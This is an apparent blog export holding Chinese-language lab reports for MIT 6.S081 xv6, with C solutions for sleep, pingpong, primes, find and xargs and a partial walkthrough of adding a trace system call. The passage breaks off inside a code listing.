    <url>/blog/2023/05/14/XV6-Lab-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT6.S081 的实验课程的 lab1 实验报告。实验内容是在一个类 unix 操作系统 xv6 上实现各种功能。lab1 内容较为简单，主要是通过系统调用实现一些工具程序。</p>
<span id="more"></span>
<h2 id="目录结构">目录结构</h2>
<p>可以看到源代码主要分为两个目录 <code>user/,
kernal/</code>，分别对应用户程序和内核程序。在 <code>user/user.h</code> 中，声明了 xv6 支持的系统调用和一些工具函数，工具函数的实现在 <code>user/ulib.c</code> 中。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system calls</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span>)</span> __<span class="title">attribute__</span><span class="params">((noreturn))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span>*)</span></span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ulib.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stat</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*, struct stat*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">strcpy</span><span class="params">(<span class="keyword">char</span>*, <span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memmove</span><span class="params">(<span class="keyword">void</span>*, <span class="keyword">const</span> <span class="keyword">void</span>*, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>此外，<code>user/</code> 目录下也保存了用户态的应用程序，以 <code>echo.c</code> 为例，通过 <code>main</code> 完成命令行传参，使用 <code>write</code> 系统调用完成写入标准输出流，调用 <code>exit</code> 显式结束执行。程序需要加入 <code>makefile</code> 中的 <code>UPROGS</code>，才会被编译加载。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/stat.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; argc; i++){</span><br><span class="line">    write(<span class="number">1</span>, argv[i], <span class="built_in">strlen</span>(argv[i]));</span><br><span class="line">    <span class="keyword">if</span>(i + <span class="number">1</span> &lt; argc){</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">" "</span>, <span class="number">1</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"\n"</span>, <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><code>kernel</code> 目录下，<code>syscall.h,
syscall.c</code> 声明了系统调用号及映射关系，系统调用的实现在 <code>sysproc.c,
sysfile.c</code> 等文件中。在本次 lab 中只需要编写用户态程序。</p>
<h2 id="exercises">Exercises</h2>
<h2 id="sleep">sleep</h2>
<p>比较简单，调用 <code>sleep</code> 系统调用，实现用户程序，代码如下。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> ticks;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt;= <span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"usage: sleep n(ticks)"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    ticks = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    sleep(ticks);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="pingpong">pingpong</h2>
<p>通过一对管道，实现父子进程的通信。</p>
<h3 id="背景知识">背景知识</h3>
<p>在 linux 下，IO 资源均抽象为文件描述符（file
description，fd），本质上就是一个整数，每个进程有一个独立的 fd 映射表，用于把 fd 映射为 IO 资源。标准输入 / 输出 / 异常分别映射到 0,1,2。在增加 IO 资源时，会分配最小可用的 fd。xv6 也使用了这种思想，因此可以通过关闭 fd，重新分配 fd 比较简单地实现 IO 重定向功能。参见实验指导书中的例子</p>
<p>xv6 中的 <code>pipe</code> 调用，用于初始化一对 fd 作为管道，分别用于读写。</p>
<h3 id="解决方法">解决方法</h3>
<p><code>pipe</code> 只能用于单向通信，为达到双向通信，需要创建一对 <code>pipe</code>，并关闭无用的写管道，避免 <code>read</code> 卡死。另外，为了避免交叉输出的混乱，建议在父进程中 <code>wait</code> 子进程结束再输出。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">int</span> parent[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> child[<span class="number">2</span>];</span><br><span class="line">    pipe(parent);</span><br><span class="line">    pipe(child);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// child</span></span><br><span class="line">        close(child[<span class="number">1</span>]);</span><br><span class="line">        read(child[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>, <span class="string">"%d: received ping\n"</span>, getpid());</span><br><span class="line">        write(parent[<span class="number">1</span>], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        close(parent[<span class="number">1</span>]);</span><br><span class="line">        write(child[<span class="number">1</span>], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        read(parent[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 避免交叉输出</span></span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>, <span class="string">"%d: received pong\n"</span>, getpid());</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="primes">primes</h2>
<p>实现一个并行的素数筛。图示如下：</p>
<p><img src="https://swtch.com/~rsc/thread/sieve.gif"></p>
<p>可以看到，其思想是一个流水线一样的操作。每个数从最左侧输入，在每个模块里，通过下面的伪代码，从左侧读入数，判断是否能被当前模块的素数整除，若不能再送到右边的模块。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">p = get a number from left neighbor</span><br><span class="line">print p</span><br><span class="line">loop:</span><br><span class="line">    n = get a number from left neighbor</span><br><span class="line">    if (p does not divide n)</span><br><span class="line">        send n to right neighbor</span><br></pre></td></tr></tbody></table></figure>
<p>需要思考的一个点就是<strong>模块是什么时候创建的</strong>。实验要求我们只能在必要的时候创建模块。思考这个过程可以发现，<strong>如果一个数到达了流水线的边界还没有被筛掉，就意味着它是一个素数，就需要在流水线末尾创建一个模块用于筛去它的倍数</strong>。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"><span class="keyword">int</span> p[<span class="number">40</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">int</span> prime)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">1</span>, <span class="string">"prime %d\n"</span>, prime);</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">while</span> (read(p[idx][<span class="number">0</span>], &amp;num, <span class="number">4</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (num % prime != <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 未初始化</span></span><br><span class="line">            <span class="keyword">if</span> (p[idx + <span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                pipe(p[idx + <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">                {</span><br><span class="line">                    close(p[idx + <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">                    process(idx + <span class="number">1</span>, num);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                {</span><br><span class="line">                    close(p[idx + <span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                write(p[idx + <span class="number">1</span>][<span class="number">1</span>], &amp;num, <span class="number">4</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    close(p[idx][<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (p[idx + <span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">    {</span><br><span class="line">        close(p[idx + <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">    }</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">34</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        nums[i] = i + <span class="number">2</span>;</span><br><span class="line">    }</span><br><span class="line">    pipe(p[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        close(p[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">        process(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        close(p[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        write(p[<span class="number">0</span>][<span class="number">1</span>], nums, <span class="keyword">sizeof</span>(nums));</span><br><span class="line">        close(p[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="find">find</h2>
<p>实现类似 linux
<code>find</code> 的功能。也比较简单，需要注意的是当文件夹匹配查找名的时候，就不用递归向下了。从 <code>ls.c</code> 中可以借鉴读取文件类型和遍历文件夹的逻辑。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/stat.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/fs.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, filename) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s%s\n"</span>, buf, path);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">int</span> ori = idx;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *p = buf + idx;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(path);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, path, len + <span class="number">1</span>);</span><br><span class="line">    idx += len;</span><br><span class="line">    <span class="comment">// fprintf(1, "buf: %s, idx = %d, path: %s, filename: %s \n", buf, idx, path, filename);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = open(buf, <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"find: cannot open %s\n"</span>, buf);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fstat(fd, &amp;st) &lt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"find: cannot stat %s\n"</span>, path);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">switch</span> (st.type)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">case</span> T_FILE:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> T_DIR:</span><br><span class="line">        <span class="keyword">if</span> (idx + <span class="number">1</span> + DIRSIZ + <span class="number">1</span> &gt; <span class="keyword">sizeof</span> buf)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"find: path too long\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        buf[idx++] = <span class="string">'/'</span>;</span><br><span class="line">        buf[idx] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">while</span> (read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (de.inum == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="built_in">memcpy</span>(name, de.name, DIRSIZ);</span><br><span class="line">            name[DIRSIZ] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, <span class="string">"."</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(name, <span class="string">".."</span>) == <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            }</span><br><span class="line">            find(name, filename);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    close(fd);</span><br><span class="line">    idx = ori;</span><br><span class="line">    buf[idx] = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"usage: find {path} {filename}"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="xargs">xargs</h2>
<p>实现类似 linux
<code>xargs</code> 的功能。从标准输入读取每一行，作为参数加在命令的后面。最简单的做法就是按实验提示，每次读入一个字符，如果是换行就处理这一行，否则继续读。不过每次读一个字符会有很大的 IO 开销，实际应用中肯定是不能这么写的。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/stat.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user/user.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/fs.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"kernel/param.h"</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt;= <span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"usage: xargs commands..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">char</span> *params[MAXARG];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; argc; i++)</span><br><span class="line">    {</span><br><span class="line">        params[i - <span class="number">1</span>] = argv[i];</span><br><span class="line">    }</span><br><span class="line">    params[argc] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (read(<span class="number">0</span>, buf + idx, <span class="number">1</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (buf[idx] != <span class="string">'\n'</span>)</span><br><span class="line">        {</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        buf[idx] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            params[argc - <span class="number">1</span>] = buf;</span><br><span class="line"></span><br><span class="line">            exec(params[<span class="number">0</span>], params);</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"command failed:"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argc + <span class="number">1</span>; i++)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"%s "</span>, params[i]);</span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">"\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            wait(<span class="number">0</span>);</span><br><span class="line">            idx = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="参考">参考</h2>
<p>我个人使用的是 2021 年秋季版本。课程官网为 <a href="https://pdos.csail.mit.edu/6.828/2021/schedule.html">6.S081 / Fall
2021 (mit.edu)</a>。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>操作系统</category>
        <category>MIT6.S081</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>实验报告</tag>
        <tag>操作系统</tag>
        <tag>MIT6.S081</tag>
      </tags>
  </entry>
  <entry>
    <title>XV6-Lab-2 实验报告: Lab: system calls</title>
    <url>/blog/2023/05/25/XV6-Lab-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 xv6 的第 2 个 lab，通过增加自定义的系统调用，了解系统调用的链路及原理。就实验内容本身来说，难度不高，也只包含两个 exercise。</p>
<span id="more"></span>
<h2 id="原理及分析">原理及分析</h2>
<p>我们知道，系统调用是操作系统内核提供的接口，提供封装好的底层功能。然而，<strong>系统调用的函数或者地址不是直接暴露给用户的</strong>。内核只是提供了一个统一的系统调用入口，称为 <code>ECALL</code>。ECALL 接收一个数字参数，当一个用户程序想要将程序执行的控制权转移到内核，它只需要执行 <code>ECALL</code> 指令，并传入一个数字。这里的数字参数代表了应用程序想要调用的系统调用。这样的设计有很多优点，最直观的是，可以在 <code>ECALL</code> 内调用系统调用前，进行参数检查或者权限检查，避免非法的调用。</p>
<p>在 xv6 中，这些 “系统调用号” 声明于 <code>kernel/syscall.h</code>，例子如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// System call numbers</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_fork    1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_exit    2</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>kernel/syscall.c</code> 中，<code>syscall</code> 根据调用号执行对应的系统调用，代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) {</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s: unknown sys call %d\n"</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><code>trapframe</code> 保存了程序陷入内核前的寄存器信息，系统调用是一种主动的陷入内核的做法。在上述 <code>syscall</code> 函数中，读取了调用号，若合法则跳转并设置返回值。<code>syscalls</code> 是一个数组，将系统调用号和具体的函数进行对应。这些函数实现在不同的文件中：进程相关的调用（如 <code>fork</code>），实现在 <code>kernel/sysproc.c</code> 中，文件相关的调用（如 <code>fstat,
read, write</code>），实现在 <code>kernel/file.c</code> 中。</p>
<p>在 C 语言中，函数参数里的 void，表明函数不接收任何参数。如果没有 void 的话，<code>void
syscall()</code> 表明函数可以接收任意参数。</p>
<p>在用户态，系统调用在 <code>user/user.h</code> 中声明，用于链接。<code>user/usys.pl</code> 是所谓的系统调用桩（stub），通过 <code>kernel/syscall.h</code>，将系统调用转化为对应调用号的 <code>ECALL</code> 的调用。该文件会被编译为 <code>user/usys.S</code>，片段如下。能够看出是声明的系统调用代码，通过 RISC-V 的 <code>ecall</code> 指令陷入内核。<code>ecall</code> 会跳转到异常处理的地址，这个地址是通过硬件编程写入的。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># generated by usys.pl - do not edit</span><br><span class="line">#include "kernel/syscall.h"</span><br><span class="line">.global fork</span><br><span class="line">fork:</span><br><span class="line"> li a7, SYS_fork # 设置系统调用号</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global exit</span><br><span class="line">exit:</span><br><span class="line"> li a7, SYS_exit</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br></pre></td></tr></tbody></table></figure>
<p>如此一来，整个系统调用的流程就串起来了：</p>
<ol type="1">
<li><code>user/user.h</code> 中的声明</li>
<li><code>user/usys.pl</code> 的系统调用桩，设置系统调用号</li>
<li>中断处理逻辑</li>
<li><code>kernel/syscall.c</code> 的 <code>syscall</code> 函数</li>
<li>对应的系统调用函数</li>
</ol>
<p>相应地，如果需要新加系统调用，也得按这个流程来。os 处理中断的逻辑与系统调用不直接相关，可以后面再理解。</p>
<h2 id="exercises">Exercises</h2>
<h3 id="trace">trace</h3>
<p>要求实现一个系统调用，能够根据一个 mask，监控某个进程对应系统调用执行结果，并打印。对于该进程创建的子进程，监控同样生效。</p>
<p>简单思考之后，不难想到这个调用需要更新一个<strong>进程级别的状态</strong>，在系统调用结束时，根据这个状态决定是否打印相关信息；在<strong>创建子进程时，需要传播这个状态</strong>。进程级的状态，最简单的是直接保存在进程结构体中，<code>kernel/proc.c</code> 中，<code>proc</code> 结构体维护了进程状态，包含锁、pid、页表等。可以在这个结构中新加一个字段，保存这个 mask。系统调用函数如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// trace system calls of given mask</span></span><br><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> mask;</span><br><span class="line">  <span class="keyword">if</span> (argint(<span class="number">0</span>, &amp;mask) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  myproc()-&gt;tracemask = mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>需要注意的是，内核里系统调用的传参机制比较特殊，不是声明在函数里，而是通过 <code>argint,
argaddr</code> 这种函数读参，猜测与中断的机制有关。</p>
<p>然后在 <code>syscall</code> 函数中的系统调用执行完毕后，根据 mask 判断是否打印信息即可。这里还需要维护一个系统调用号到系统调用名的数组 <code>sysname</code>，方便打印调用名。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span> (num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num])</span><br><span class="line">  {</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s: unknown sys call %d\n"</span>,</span><br><span class="line">           